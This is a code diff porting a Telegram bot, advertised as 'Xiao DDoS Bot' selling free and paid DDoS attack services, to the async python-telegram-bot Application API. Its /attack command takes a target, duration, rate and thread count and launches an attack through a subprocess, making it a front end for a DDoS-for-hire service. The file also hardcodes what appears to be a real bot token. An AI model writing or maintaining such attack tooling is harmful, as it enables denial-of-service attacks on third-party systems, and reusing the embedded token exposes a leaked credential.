@@ -1,12 +1,12 @@
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram.ext import Application, CommandHandler, CallbackContext
 import subprocess
 
 # Thay YOUR_TELEGRAM_BOT_TOKEN bằng mã token bạn nhận được từ BotFather
 TOKEN = '6151599157:AAEXFXPYCjjSpCusnHQeALrbEppY32qQdrc'
 
-def start(update: Update, context: CallbackContext) -> None:
-    update.message.reply_text(
+async def start(update: Update, context: CallbackContext) -> None:
+    await update.message.reply_text(
         'Welcome to Xiao DDoS Bot!\n\n'
         'XiaoNam Bot Free and Paid DDoS Attack Services\n\n'
         'Type /attack to see the attack usage!\n\n'
@@ -14,9 +14,9 @@ def start(update: Update, context: CallbackContext) -> None:
         'Best C2/API Of 2024 -> @Xiaocoderz🚀'
     )
 
-def attack(update: Update, context: CallbackContext) -> None:
+async def attack(update: Update, context: CallbackContext) -> None:
     if len(context.args) != 4:
-        update.message.reply_text('Usage: /attack <TARGET> <TIME> <RATES> <THREAD>')
+        await update.message.reply_text('Usage: /attack <TARGET> <TIME> <RATES> <THREAD>')
         return
 
     target, time, rates, thread = context.args
@@ -27,7 +27,7 @@ def attack(update: Update, context: CallbackContext) -> None:
     try:
         result = subprocess.run(command, capture_output=True, text=True, check=True)
         output = result.stdout
-        update.message.reply_text(
+        await update.message.reply_text(
             f'Attack successfully sent!\n\n'
             f'- 🚀 Target: {target} | Time: {time} | Rates: {rates} | Thread: {thread}\n\n'
             f'👤 Sender:\n\n'
@@ -35,18 +35,15 @@ def attack(update: Update, context: CallbackContext) -> None:
             f'Best C2/API of 2024 -> @Xiaocoderz'
         )
     except subprocess.CalledProcessError as e:
-        update.message.reply_text(f'Error: {e}')
+        await update.message.reply_text(f'Error: {e}')
 
 def main() -> None:
-    updater = Updater(TOKEN)
+    application = Application.builder().token(TOKEN).build()
 
-    dispatcher = updater.dispatcher
+    application.add_handler(CommandHandler('start', start))
+    application.add_handler(CommandHandler('attack', attack))
 
-    dispatcher.add_handler(CommandHandler('start', start))
-    dispatcher.add_handler(CommandHandler('attack', attack))
-
-    updater.start_polling()
-    updater.idle()
+    application.run_polling()
 
 if __name__ == '__main__':
     main()
